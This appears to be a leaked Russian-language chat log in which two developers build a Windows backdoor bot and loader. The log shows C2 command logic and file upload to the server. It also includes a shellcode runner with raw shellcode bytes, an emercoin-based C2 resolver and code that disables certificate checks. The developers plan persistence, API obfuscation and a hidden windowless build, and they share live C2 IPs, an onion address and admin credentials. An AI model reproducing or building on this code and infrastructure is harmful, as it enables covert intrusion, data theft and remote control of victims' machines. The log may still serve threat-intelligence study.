Timestamp	From	To	Message
2020-06-22 08:48:55.226859	mushroom	frog	Посмотрел код твой. Уточнение у тебя команда 1 считается не блокирующей?
2020-06-22 08:49:37.525086	mushroom	frog	//  Если в данный момент времени работает не блокирующая команда, а приходит любая команда, кроме Reset, её нужно игнорировать
	if (((tcode >= 10 && tcode <= 13) || tcode == 1) && new_command_code != 14)
		return;
2020-06-22 08:53:03.073114	frog	mushroom	Привет!
Сначала сделал, чтобы команду 1 можно было прервать, а только потом узнал, что она должна быть блокирующей. Оставил её как неблокирующую (на всякий случай, хуже наверное же не будет).
2020-06-22 08:57:05.060621	mushroom	frog	По идее не будет. Ещё уточнение, если какая либо ошибка происходит в процессе выполнения команды любой, что на сервер отправляешь?
2020-06-22 09:00:24.229903	frog	mushroom	Текст сообщения об ошибке.
Например:
send_result(string("could not download file from ") + uri);
2020-06-22 09:00:57.769842	mushroom	frog	Ещё код отправляй GetLastError который.
2020-06-22 09:01:05.732847	mushroom	frog	Или только код.
2020-06-22 09:01:27.086878	mushroom	frog	Чтобы точно можно было определить в чём ошибка.
2020-06-22 09:03:17.039021	mushroom	frog	Если ошибка при передаче произошла, ещё делаешь попытки отправить тоже самое?
2020-06-22 09:04:18.568294	frog	mushroom	Хорошо
2020-06-22 09:04:50.505095	frog	mushroom	Нет, пока это не делал.
2020-06-22 09:06:10.020680	mushroom	frog	Будешь делать когда команды все доделаешь?
2020-06-22 09:06:18.733178	mushroom	frog	Какие остались?
2020-06-22 09:08:53.892539	frog	mushroom	Остался Terminate Process. Остальные сделал, протестировал на каких-то своих данных, вроде всё работает.
2020-06-22 09:09:22.279686	mushroom	frog	Команда загрузки файла на сервер работает?
2020-06-22 09:10:58.200824	frog	mushroom	Но получается обработку ошибок нужно сделать везде (добавить GetLastError, отправку PID процесса и т.д.). Команду загрузки файла протестировал, с сервера потом загружается такой же файл, как и был отправлен (следовательно, всё работает)
2020-06-22 09:15:13.874127	mushroom	frog	Для загрузки файла на сервер советую сделать таймаут для запроса побольше, а то бывает что связь с серверром тормозная.
DWORD timeoutSize = sizeof(timeout);
wininet.internetSetOption(req, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, timeoutSize);
2020-06-22 09:15:39.607312	mushroom	frog	8 - 10 минут таймаут сделай.
2020-06-22 09:37:44.395979	mushroom	frog	Ещё уточнение. После того как отрабатывают процессы на запуск файла с диска, ты эти файлы удаляешь? Имена этих файлов генерируешь случайным образом?
2020-06-22 09:39:58.603998	frog	mushroom	Да, имена генерирую случайным образом (из 10 символов), сохраняю в папке temp. Потом удаляю, после того, как процесс завершится.
2020-06-22 09:40:26.851579	mushroom	frog	OK. Таймаут как я писал выше повысь для запроса.
2020-06-22 09:40:40.054690	mushroom	frog	Загрузки файла на сервер.
2020-06-22 09:43:48.078559	frog	mushroom	Хорошо. 
2020-06-23 09:02:52.171480	mushroom	frog	Я вчера забыл спросить. У тебя шелл код выполняется в блоке SEH?
2020-06-23 09:03:24.533198	mushroom	frog	А то накроется вся программа при малейшей ошибке в шелл коде.
2020-06-23 09:05:29.021352	mushroom	frog	Типа так:
__try
    {
        (*(VOID(*)())codeAddr)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
    }
2020-06-23 09:05:57.520692	mushroom	frog	__try\__except обязательно оберни
2020-06-23 09:06:11.234896	frog	mushroom	Привет
Нет. Тоже об этом думал. Попытался обернуть это в секцию try, catch, но не помогло. 
Хорошо, сделаю так. Спасибо.
2020-06-23 09:06:41.477015	mushroom	frog	try\catch не ловит такие ошибки, а SEH ловит.
2020-06-23 09:07:14.278911	frog	mushroom	А в стандартный канал нужно считывать в этом случае?
2020-06-23 09:07:32.707676	mushroom	frog	Нет. Ты его никак не считаешь.
2020-06-23 09:07:57.552486	mushroom	frog	Это же просто выполнение инструкций машинных.
2020-06-23 09:08:13.482266	mushroom	frog	У тебя есть пример шелл кода?
2020-06-23 09:09:30.249461	frog	mushroom	Простой какой-то сам себе сделал, который соответствует командам 
MOV EAX, 128
RET
2020-06-23 09:10:11.362967	mushroom	frog	Вот:
33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 F3 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 6C 8B CC 57 57 51 57 FF D0
2020-06-23 09:11:41.812703	mushroom	frog	Окно Hello World показывает, это 32 битный код. Так как там не востанавливается стек после вызова как раз и произойдёт ошибка, которую __try\__catch должно поймать. Но окно Hello World ты увидишь, как закроешь его и произойдёт ошибка.
2020-06-23 09:14:12.148822	mushroom	frog	__try\__except я имел ввиду.
2020-06-25 13:22:42.191300	mushroom	frog	Привет. Что на данный момент осталось из команд?
2020-06-25 19:39:23.336625	frog	mushroom	Осталась команда Terminate Process. Сделал обработку исключений для команды Shell Code. Собираюсь ещё в ближайшее время сделать отправку кода последней ошибки LastErrorCode.
2020-06-26 07:08:30.518294	frog	mushroom	Осталась команда Terminate Process. Сделал обработку исключений для команды Shell Code. Собираюсь ещё в ближайшее время сделать отправку кода последней ошибки LastErrorCode.
2020-06-26 13:48:25.189538	mushroom	frog	Сообщи когда доделаешь бот, я хочу скомпилировать у себя и посмотреть. Ещё сделай утилиту, которая выводит в stdout такой же id бота, как генерирует его программа твоя, это нужно для автотестов.
2020-06-29 08:16:53.085014	frog	mushroom	Добрый день.
Доделал команды. Утилиту тоже сделал. Загрузил всё на gitlab.
2020-06-29 09:18:30.908498	mushroom	frog	OK. Посмотрю. Доделывай загрузчик.
2020-06-29 09:18:47.162135	mushroom	frog	Закрепление в системе.
2020-06-29 09:24:08.489957	frog	mushroom	Пример какой-нибудь где можно посмотреть?
2020-06-29 09:24:41.508030	mushroom	frog	Сейчас пришлю.
2020-06-29 09:27:16.717525	mushroom	frog	https://send.firefox.com/download/002a7f773739c622/#5liyPOtHqNs6z-JvZbNjCA
2020-06-29 09:27:24.085097	mushroom	frog	Пароль: }]AuYgk<"T+GypuSD
2020-06-29 09:29:08.570647	mushroom	frog	И в ТЗ есть ссылка на статью в которой описываются возможные способы https://habr.com/ru/post/425177/
2020-06-29 09:30:01.804301	frog	mushroom	Спасибо
2020-06-29 14:54:55.905639	mushroom	frog	Бинарники не коммить в репозиторий. bd7_id.exe убери. Просто бинарники на прямую присылай, тому кто просит.
2020-06-29 14:55:21.609655	mushroom	frog	В зашифрованном архиве, с шифрованными заголовками файлов.
2020-06-29 15:12:37.762770	frog	mushroom	Готово.
https://send.firefox.com/download/f84edc7610dfa4b1/#C8FTKpKAgfnUl8gMwPN21g
jkf34~!@##$78tkfolf;=2-34i
Удалил бинарник
2020-06-29 15:19:01.360100	mushroom	frog	OK.
2020-06-29 15:20:53.563946	mushroom	frog	А что их два? Id зависит от битности программы?
2020-06-29 15:26:17.153818	frog	mushroom	Нет, id одинаковые выдают. Подумал, может нужны оба (для тестирования), поэтому на всякий случай сделал
2020-06-29 15:26:43.019955	mushroom	frog	Понял.
2020-06-29 15:35:37.318190	mushroom	frog	У тебя в ботах такой есть fd55ba0a664663c0f816699197d3778a ?
2020-06-29 15:36:10.160127	mushroom	frog	Я группу заменил у тебя в исходниках на свою и не вижу бота этого у себя.
2020-06-29 15:49:37.464433	frog	mushroom	Есть такой
2020-06-29 15:50:43.831363	mushroom	frog	У него группа frog?
2020-06-29 15:51:00.570539	frog	mushroom	Да
2020-06-29 15:51:43.200774	mushroom	frog	Понял. Значит поменяю id.
2020-06-30 08:03:03.793005	mushroom	frog	Привет. Читал в задании к загрузчику как надо подключаться к серверу?
2020-06-30 08:38:09.046242	mushroom	frog	Смотрю бэкдор твой.
2020-06-30 08:39:00.430572	mushroom	frog	Выполняется команда 0 300, получается 300 секунд ждёт в команде и ещё 300 секунд между командами.
2020-06-30 08:39:58.765864	mushroom	frog	Команда 0 <время> значит запросить команду через <время секунд>, не нужно ещё пять минут ждать.
2020-06-30 08:40:13.557651	mushroom	frog	Для команды 1 так же.
2020-06-30 08:40:42.518736	mushroom	frog	А вот для команд на запуск процессов, нужно каждые 5 минут запрашивать команду.
2020-06-30 08:42:25.520662	mushroom	frog	Выполнил команду на запуск скрипта:
Microsoft Windows [Version 10.0.19041.329]
(c) Љ®аЇ®а жЁп Њ ©Єа®б®дв (Microsoft Corporation), 2020. ‚бҐ Їа ў  § йЁйҐ­л.

C:\Users\ivana\Projects\others\bd7\bd7>dir
’®¬ ў гбва®©бвўҐ C Ё¬ҐҐв ¬ҐвЄг
BOOTCAMP
‘ҐаЁ©­л© ­®¬Ґа в®¬ : 0246-9FF7

‘®¤Ґа¦Ё¬®Ґ Ї ЇЄЁ C:\Users\ivana\Projects\others\bd7\bd7
2020-06-30 08:42:53.449821	mushroom	frog	Он выполнился, но ты наверное забыл вывод в UTF-8 закодировать.
2020-06-30 08:43:24.105120	mushroom	frog	Всё что на сервер посылаешь всё нужно в UTF-8 кодировать.
2020-06-30 08:47:18.688470	frog	mushroom	Привет. Хорошо. Пробовал кодировать в UTF-8, но что-то тогда не получилось, сервер не хотел принимать ответ. Попробую ещё раз, может где-то ошибся.
По поводу таймаутов: просто не понял этот момент в ТЗ.
2020-06-30 08:48:41.242682	mushroom	frog	Это только для команд 0 и 1 таймаут значит перезвонить на сервер через таймаут после выполнения команды.
2020-06-30 08:48:57.414252	mushroom	frog	0 300 -> перезвонить через 5 минут
2020-06-30 08:49:17.771338	mushroom	frog	1 300 -> перезвонить через 5 минут после выполнения команды.
2020-06-30 08:49:57.457040	mushroom	frog	Для всех остальных у кого есть таймаут (это запуск процесса), таймаут это время работы процесса максимальное.
2020-06-30 08:50:43.570634	mushroom	frog	У кого нет таймаута, после выполнения команды ждать 5 минут по умолчанию.
2020-06-30 08:52:00.033331	mushroom	frog	Ну и когда процесс работает, он же не блокирующая команда, через каждые 5 минут команду запрашивать, как по умолчанию.
2020-06-30 08:54:27.911993	mushroom	frog	Окно это для отладки выходит всё время с выводом?
2020-06-30 08:54:52.852858	frog	mushroom	Да, это для отладки
2020-06-30 08:57:40.317099	frog	mushroom	Когда выполнили команду запуска (неблокирующую команду), отослали результат, следующую команду запрашивать сразу или подождать в цикле когда  5 минут истечёт?
2020-06-30 09:00:29.067517	mushroom	frog	Получил команду, запустил процесс, спишь 5 минут, процесс работает, если он 1 минуту отработал, отправил результат на сервер, осталось спать 4 минуты получается, 4 минут прошло, запрос команды.
2020-06-30 09:01:37.756440	mushroom	frog	То есть спит программа между запросами 5 минут не зависимо от работающего процесса.
2020-06-30 09:02:00.997101	frog	mushroom	Понятно.
2020-06-30 09:02:23.661200	mushroom	frog	Единственное надо синхронизировать потоки.
2020-06-30 09:02:33.855425	mushroom	frog	Ну ты в курсе я думаю.
2020-06-30 09:03:16.080792	frog	mushroom	Конечно
2020-06-30 09:04:05.202569	mushroom	frog	Что то powershell скрипт "cd c:\\r\ndir\r\n" никакого вывода.
2020-06-30 09:04:29.220105	mushroom	frog	Это я запускал без файла.
2020-06-30 09:04:35.796674	mushroom	frog	Проверь.
2020-06-30 09:05:30.758381	mushroom	frog	А не, работает.
2020-06-30 09:06:13.436638	mushroom	frog	Я окно не закрыл отладочное. После него отправляется на сервер вывод.
2020-06-30 09:06:49.218275	mushroom	frog	Файлы, если запуск со скачкой на диск в temp сохраняются?
2020-06-30 09:07:00.716493	frog	mushroom	Так точно
2020-06-30 09:07:32.864457	frog	mushroom	Окно отладочное показывает, что отправляется на сервер.
2020-06-30 09:08:24.026959	mushroom	frog	Вывод сделай для отладки имена этих файлов, чтобы можно было проверить в temp, что они удаляются после того как отработали.
2020-06-30 09:12:11.444479	mushroom	frog	И вывод для отладки поподробней сделай, чтобы тестер тебе когда ошибки возникают лог отправлял, и ты ошибку быстро находил. Вывод адресов куда подключаешься точно нужно сделать.
2020-06-30 09:12:55.966838	frog	mushroom	И вывод для отладки поподробней сделай, чтобы тестер тебе когда ошибки возникают лог отправлял, и ты ошибку быстро находил. Вывод адресов куда подключаешься точно нужно сделать.
2020-06-30 09:14:02.245134	mushroom	frog	И вывод для отладки поподробней сделай, чтобы тестер тебе когда ошибки возникают лог отправлял, и ты ошибку быстро находил. Вывод адресов куда подключаешься точно нужно сделать.
2020-06-30 09:15:51.901364	frog	mushroom	http-адресов?
А отладочный вывод делать в Std Output?
2020-06-30 09:16:27.865827	mushroom	frog	http адресов, отладочный вывод, это который у тебя debug_printf
2020-06-30 09:17:07.863917	mushroom	frog	Чтобы вывод debug_printf отключить можно было полностью через макрос.
2020-06-30 09:17:27.077114	mushroom	frog	Буза тебе давал для вывода отладочного файлы?
2020-06-30 09:17:51.906986	frog	mushroom	Нет
2020-06-30 09:18:49.290482	mushroom	frog	debug_printf это ты сам написал значит?
2020-06-30 09:19:11.000830	mushroom	frog	Оставляй их я тебе пришлю сейчас.
2020-06-30 09:20:53.829253	mushroom	frog	https://send.firefox.com/download/f61414768ac8ffad/#0qIz2TZulK3-7rDckHyoIA
2020-06-30 09:20:58.495850	mushroom	frog	Пароль: 123
2020-06-30 09:21:54.935323	mushroom	frog	Связь?
2020-06-30 09:24:40.727012	frog	mushroom	Здесь
2020-06-30 09:24:46.619431	mushroom	frog	Получил?
2020-06-30 09:24:51.933187	frog	mushroom	Да
2020-06-30 09:25:05.368520	mushroom	frog	debug_printf("Text")
2020-06-30 09:25:21.314084	mushroom	frog	Макросом выключается полностью если надо.
2020-06-30 09:25:45.184759	mushroom	frog	В файле tdebug.h
2020-06-30 09:25:55.229998	mushroom	frog	Смотри
2020-06-30 09:26:16.767686	mushroom	frog	Там есть вывод в консоль, в файл, в debug output.
2020-06-30 09:27:10.109312	mushroom	frog	макрос RELEASE_NO_LOGS отключает весь вывод через debug_printf
2020-06-30 09:28:38.928258	mushroom	frog	макрос LOG_TO_FILE вывод в файл такой же как и в консоль, работает если макрос RELEASE_NO_LOGS не указан.
2020-06-30 09:29:06.433224	mushroom	frog	Разберешься, изменишь что нужно под себя.
2020-06-30 09:29:44.796650	mushroom	frog	В проекте сейчас Debug x86\x64, Release x86\x64.
2020-06-30 09:30:24.408067	mushroom	frog	Надо добавить ещё Release_nologs x86\x64 в решение, и там отключить весь отладочный вывод.
2020-06-30 09:30:55.360464	mushroom	frog	А в Release x86\x64 сделать вывод в консоль и в файл.
2020-06-30 09:31:26.575076	mushroom	frog	Принял?
2020-06-30 09:31:33.731883	frog	mushroom	Так точно
2020-06-30 09:32:49.493601	mushroom	frog	Когда сделаешь поправки все пиши. Тогда скажу как обфусцировать вызовы WinApi.
2020-06-30 09:34:06.444802	frog	mushroom	Через GetApi.h не надо было обфусцировать?
2020-06-30 09:34:33.456677	mushroom	frog	Можно и так. Только там нету всех функций что у тебя в коде.
2020-06-30 09:35:38.021163	mushroom	frog	Я тебе ещё один вариант покажу, а там решишь как тебе удобней.
2020-06-30 10:06:37.250821	mushroom	frog	5 мб файл не смог загрузить на сервер твоим бэкдор.
2020-06-30 10:06:54.914619	mushroom	frog	Проверь.
2020-06-30 10:08:33.419402	frog	mushroom	5 мб файл не смог загрузить на сервер твоим бэкдор.
2020-06-30 10:08:33.429012	frog	mushroom	Проверь.
2020-06-30 10:14:56.000881	mushroom	frog	Связь есть?
2020-06-30 10:16:27.567196	mushroom	frog	Команда информация о системе дала ip неверный 192.168.56.1 192.168.1.42, а надо внешний ip.
2020-06-30 10:16:28.706996	mushroom	frog	5 мб файл не смог загрузить на сервер твоим бэкдор.
2020-07-02 07:53:14.258743	frog	mushroom	Привет!
Функция CHTTP::postBinary выполняет отправку файла на сервер. Не пойму, что делаю в ней не так. Таймаут увеличил до 10 минут.
2020-07-02 08:06:50.886146	mushroom	frog	Привет. Сейчас посмотрю.
2020-07-02 08:12:35.755071	mushroom	frog	Перед отправкой шифруешь файл?
2020-07-02 08:12:48.568798	mushroom	frog	В postBinary нету шифрования.
2020-07-02 08:13:26.565387	frog	mushroom	В CHTTP::post шифрование
2020-07-02 08:14:36.335872	mushroom	frog	Content-Length: %d d в заголовке можно не писать, это wininet сам вставит.
2020-07-02 08:16:35.220191	mushroom	frog	CHTTP::post нету шифрования тоже.
2020-07-02 08:17:28.638946	frog	mushroom	bool CHTTP::post(char* id, const PBYTE data, DWORD data_size)
{
    // Отправим результат работы на сервер
    PBYTE xor_data = (PBYTE)pHeapAlloc(GetProcessHeap(), 0, data_size);

    xor_crypt(data, data_size, id, xor_data);
2020-07-02 08:17:51.543210	frog	mushroom	xor_crypt - шифрование.
2020-07-02 08:18:27.252406	mushroom	frog	Вот что у меня:
bool CHTTP::post(const char* objectName, const PBYTE body, DWORD bodyLength, PBYTE* data, DWORD* dataSize)
{
    if (data != nullptr) *data = nullptr;
    if (dataSize != nullptr) *dataSize = 0;

    if (hHttpSession == NULL)
        return false;
    HINTERNET hHttpRequest = HttpOpenRequestA(
        hHttpSession, "POST", objectName, "1.1",
        nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, 0);

    if (hHttpRequest == NULL)
        return false;

    char szHeaders[] = "Content-Type: application/x-www-form-urlencoded\r\nCookie: group=" GROUP;
    if (!HttpSendRequestA(hHttpRequest, szHeaders, strlen(szHeaders), body, bodyLength))
    {
        InternetCloseHandle(hHttpRequest);
        return false;
    }

    // Проверяем код статуса
    if (!okStatus(hHttpRequest))
    {
        InternetCloseHandle(hHttpRequest);
        return false;
    }

    read(hHttpRequest, data, dataSize);

    InternetCloseHandle(hHttpRequest);
    return true;
}
2020-07-02 08:19:22.850871	mushroom	frog	Нашёл перегруженный метод. Там есть шифрование.
2020-07-02 08:27:27.332935	mushroom	frog	Может Content-Length: %d в заголовке. Попробуй без него, его wininet высчитывает сам.
2020-07-02 08:28:21.019104	mushroom	frog	Я ещё у себя проверю, может сервер тупит, попозже.
2020-07-02 09:39:13.882853	mushroom	frog	Я проверил у себя. У меня тоже файл не отправляется. Это на сервере косяк, такое уже было. Отложи пока эту команду.
2020-07-02 09:43:24.656701	frog	mushroom	Я проверил у себя. У меня тоже файл не отправляется. Это на сервере косяк, такое уже было. Отложи пока эту команду.
2020-07-02 09:44:23.327428	mushroom	frog	Я проверил у себя. У меня тоже файл не отправляется. Это на сервере косяк, такое уже было. Отложи пока эту команду.
2020-07-02 09:44:49.246104	frog	mushroom	Хорошо. Но картинку размером 1,75 мб всё-таки удалось отправить с n-ой попытки
2020-07-02 09:45:24.387070	mushroom	frog	Да. Маленькие файлы сервер принимает.
2020-07-02 09:45:39.658016	mushroom	frog	5 мб не принимает.
2020-07-02 09:46:06.120259	mushroom	frog	А должен до 10 мб включительно принимать.
2020-07-02 09:46:47.552863	mushroom	frog	Команда информация о системе дала ip неверный 192.168.56.1 192.168.1.42, а надо внешний ip. Это было в прошлый раз когда я смотрел. Изменения есть?
2020-07-02 09:48:13.071206	frog	mushroom	Сделал запрос внешнего ip-адреса с "https://myexternalip.com/raw".
2020-07-02 09:48:30.434509	mushroom	frog	Типа того.
2020-07-02 09:52:52.865395	mushroom	frog	Команда suicide отправляет что нибудь на сервер?
2020-07-02 09:53:11.553087	mushroom	frog	Надо отправлять OK и выключаться.
2020-07-02 09:53:55.111362	mushroom	frog	В прошлый раз не отправляла ничего, из-за этого в админке эта команда pending.
2020-07-02 09:58:51.132656	mushroom	frog	Сейчас выполнил команду 1 пришли такие ip 192.168.56.1, 192.168.1.42.
2020-07-02 09:59:03.292234	mushroom	frog	Опять не внешние.
2020-07-02 09:59:45.957130	frog	mushroom	Хорошо, сделаю.
Если нужно, можно в функции process в цикле сделать
command = "14";
Ещё сделал кодирование из OEM в ANSI содержимого стандартных потоков. Теперь на сервере всё читается.
Сейчас проверю, может на gitlab ещё не загрузил.
2020-07-02 10:00:22.018312	mushroom	frog	И система как Win 8 определяется, а у меня Win 10.
2020-07-02 10:00:49.958729	mushroom	frog	В поле где антивирусы
Standart Output
Standart Error
ОШИБКА.
Описание: Неправильное пространство имен
2020-07-02 10:02:26.856651	mushroom	frog	Скажешь когда загрузишь. Так получается всё сделано?
2020-07-02 10:03:00.353817	frog	mushroom	Ещё нужно debug_printf всюду вставить.
2020-07-02 10:04:23.402356	mushroom	frog	Тогда скажу чтобы тебе сделали учётную запись в рабочей админке, чтобы там тестировать.
2020-07-02 10:07:34.322459	frog	mushroom	Антивирусник узнаю так:
run("wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list");
Сделаю команду отключения, отладку (debug_printf) и потом загружу на gitlab
2020-07-02 10:24:08.804281	mushroom	frog	И ещё у тебя сейчас адрес сервера просто берётся, а в ТЗ его надо получать. Сначала проходить по списку простых адресов, потом по списку адресов emercoin, потом по списку сгенерированных адресов. Это у загрузчика и у бота одинаково происходит. Когда учётную запись сделают тебе на рабочей админке, я дам тебе эти списки.
2020-07-02 10:24:50.025740	mushroom	frog	Ты же не сделал получение адреса из сети emercoin?
2020-07-02 10:25:46.083356	frog	mushroom	Нет. Ещё не сделал.
2020-07-02 10:26:10.385817	mushroom	frog	Тебе Буза пример давал?
2020-07-02 10:27:42.556276	frog	mushroom	Есть модуль resolve_emercoin.h среди тех файлов, что давал Буза
2020-07-02 10:29:01.047609	mushroom	frog	Значит есть. Есть ещё один способ, он проще, я сейчас пришлю, он будет основным, а resolve_emercoin запасным.
2020-07-02 10:30:44.811364	mushroom	frog	BOOL emercoinResolveDns(PCSTR emercoinAddress, PSTR resolvedAddress)
{
	PBYTE resp = NULL;
	SIZE_T respSize = 0;
	if (downloadBuffer(_TSTR(TEXT("https://api.opennicproject.org/geoip/?bare&ipv=4")), &resp,
		&respSize))
	{
		IP4_ARRAY dnsServersArray = { 0 };
		dnsServersArray.AddrCount = 1;

		PDNS_RECORD dnsRecord = NULL;
		DNS_STATUS status;

		PSTR addrs = (PSTR)resp;
		PSTR context = NULL;
		while (*addrs != '\0')
		{
			IN_ADDR addr = { 0 };
			PSTR token = strtok_s(addrs, "\n", &context);
			addrs = context;

			if (pinet_pton(AF_INET, token, &addr))
			{
				CopyMemory(dnsServersArray.AddrArray, &addr, sizeof(IN_ADDR));
				status = dnsapi.dnsQuery_A(emercoinAddress, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE,
					&dnsServersArray, &dnsRecord, NULL);
				if (0 == status)
				{
					CHAR addrStr[17];
					pinet_ntop(AF_INET, (PVOID)&dnsRecord->Data.A.IpAddress, addrStr,
						sizeof(addrStr));
					lstrcpyA(resolvedAddress, addrStr);

					dnsapi.dnsFree((PVOID)dnsRecord, DnsFreeRecordList);
					HeapFree(GetProcessHeap(), 0, resp);
					return TRUE;
				}

				dnsapi.dnsFree((PVOID)dnsRecord, DnsFreeRecordList);
			}
		}

		HeapFree(GetProcessHeap(), 0, resp);
	}

	return FALSE;
}
2020-07-02 10:31:51.320724	mushroom	frog	downloadBuffer(_TSTR(TEXT("https://api.opennicproject.org/geoip/?bare&ipv=4")) это просто GET запрос, получает список адресов.
2020-07-02 10:33:22.557681	mushroom	frog	В общем там адрес получается через dns запрос.
2020-07-02 10:38:17.526469	mushroom	frog	Вот для тренировки адрес thegame.bazar, должен получиться 34.222.222.126.
2020-07-02 10:39:59.996772	mushroom	frog	Каждый байт адреса после выполнения функции emercoinResolveDns ещё нужно расшифровать xor 254. И тогда уже получится 34.222.222.126.
2020-07-02 10:40:11.706021	mushroom	frog	Это левый адрес, на него ничего не шли.
2020-07-02 10:40:22.937385	mushroom	frog	Будут вопросы пиши.
2020-07-02 10:41:14.585558	mushroom	frog	Байт адреса имеется ввиду <байт>.<байт>.<байт>.<байт>
2020-07-03 10:45:04.742704	mushroom	frog	Привет.
2020-07-03 10:45:13.774666	mushroom	frog	Логин: b16
2020-07-03 10:45:27.082876	mushroom	frog	Пароль: ZYI%bLmcEAbV1sqQ
2020-07-03 10:45:48.491975	mushroom	frog	Это боевой сервер.
2020-07-03 10:46:13.110508	mushroom	frog	лоадеры
85.204.116.243
86.104.194.108
89.32.41.184
192.99.255.32
66.70.218.37
107.173.114.117
2020-07-03 10:46:24.530293	mushroom	frog	бот
185.180.198.99
86.104.194.109
45.148.120.173
185.99.2.221
5.1.81.68
86.104.194.110
2020-07-03 10:46:43.548751	mushroom	frog	Списки адресов.
2020-07-03 10:47:13.989512	mushroom	frog	Сделай подключение к серверу как в ТЗ для лоадера описано.
2020-07-03 10:49:09.428273	mushroom	frog	3 списка, первый список это чистые адреса, я их написал выше, второй список это адреса emercoin, сам можешь их придумать типа bestgame.bazaar, третий список генерируется автоматически на основе даты (описано в ТЗ для лоадера).
2020-07-03 10:49:54.762190	mushroom	frog	Это подключение происходит одинаково для бота и лоадера.
2020-07-03 10:52:56.292726	mushroom	frog	И сделай как удобно тебе, чтобы не путаться когда подключаешься к тестовому серверу, а когда к боевому. У меня например если макрос _DEBUG установлен подключение к тестовому, если нет к боевому. Release_nologs должны быть программа оконная, а не консоль (/SUBSYSTEM:WINDOWS), у тебя как сейчас?
2020-07-03 10:56:09.198169	frog	mushroom	Привет!
Release_nologs пока консольная.
2020-07-03 10:56:22.747889	mushroom	frog	Твоя группа на боевом сервере seven, не путай её с группой, которая у тебя на тестовом сервере. Для боевого seven, для тестового frog.
2020-07-03 10:56:57.892801	mushroom	frog	Поменяй Release_nologs на оконную программу, чтобы пользователь ничего не видел вообще.
2020-07-03 10:57:37.567904	frog	mushroom	Хорошо. Какой http-адрес боевого сервера?
2020-07-03 10:57:57.692192	mushroom	frog	https://scrytnuuszglaugg.onion
2020-07-06 11:18:46.229068	frog	mushroom	Привет.
Можно ли узнать дату и SID на сервере, не запрашивая саму команду (/%id%/2)? Есть ли отдельная команда для этого?
Дату подписывать локальную?
Поиск сервера выполняется один раз при запуске или там другой алгоритм?
2020-07-06 11:20:41.826433	mushroom	frog	Привет. Поиск сервера осуществляется при запуске, а если произошла какая нибудь ошибка связи, опять поиск по спискам.
2020-07-06 11:22:21.361031	mushroom	frog	Для получения SID не запрашивая команду делай запрос GET /<id>/4
2020-07-06 11:23:14.266159	mushroom	frog	Дата подписана та которую сервер присылает в заголовке.
2020-07-06 11:25:44.363864	mushroom	frog	Сервер пришлёт дату типа 2020-07-06 09:00:10 проверять подпись нужно только даты, время отбрасывать.
2020-07-06 11:26:34.507739	mushroom	frog	В случае если не удалось найти валидный командный сервер за 3 часа, следует либо завершиться, либо удалить себя из системы (определяется настройками сборки).
2020-07-06 11:27:06.751506	mushroom	frog	Алгоритм подключения полный смотри в ТЗ для загрузчика, он одинаковый для загрузчика и для бота.
2020-07-06 11:28:18.436548	mushroom	frog	Если ошибка при передаче данных произойдёт, ещё несколько попыток послать запрос, не удачно, переподключение.
2020-07-06 11:28:57.302284	mushroom	frog	Не получилось переподключиться за 3 часа, выход.
2020-07-06 11:34:30.064783	frog	mushroom	Использовать порт 80?
2020-07-06 11:35:53.462478	mushroom	frog	https используй всегда на боевом сервере, на тестовом какой хочешь.
2020-07-06 11:39:32.909136	mushroom	frog	Для https запросов, после функции HttpOpenRequest, надо установить флаги, чтобы игнорировать ошибки сертификатов, так как на сервере они самописные.
2020-07-06 11:39:44.418292	mushroom	frog	DWORD flags = 0;
    DWORD flagsSize = sizeof(flags);
    wininet.internetQueryOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flagsSize);
    if (isSecure)
    {
        flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
        flags |= SECURITY_FLAG_IGNORE_REVOCATION;
    }
    else
        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
    wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);
2020-07-06 11:39:49.927384	mushroom	frog	типа так
2020-07-06 11:42:13.505109	frog	mushroom	isSecure равен значению "истина", если порт 443?
2020-07-06 11:46:01.325063	mushroom	frog	Да если https соединение, может же быть теоретически https соединение не для порта 443. По умолчанию 443.
2020-07-06 11:46:55.526753	mushroom	frog	ПРи открытии запроса тоже флаг не забудь передать если https соединение
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);
2020-07-06 11:46:58.494235	mushroom	frog	типа так
2020-07-06 11:47:49.715079	frog	mushroom	Хорошо. Спасибо!
2020-07-06 11:47:54.505901	mushroom	frog	HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
       NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0); 
DWORD flagsSize = sizeof(flags);
   wininet.internetQueryOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flagsSize);
   if (isSecure)
   {
       flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
       flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
       flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
       flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
       flags |= SECURITY_FLAG_IGNORE_REVOCATION;
   }
   else
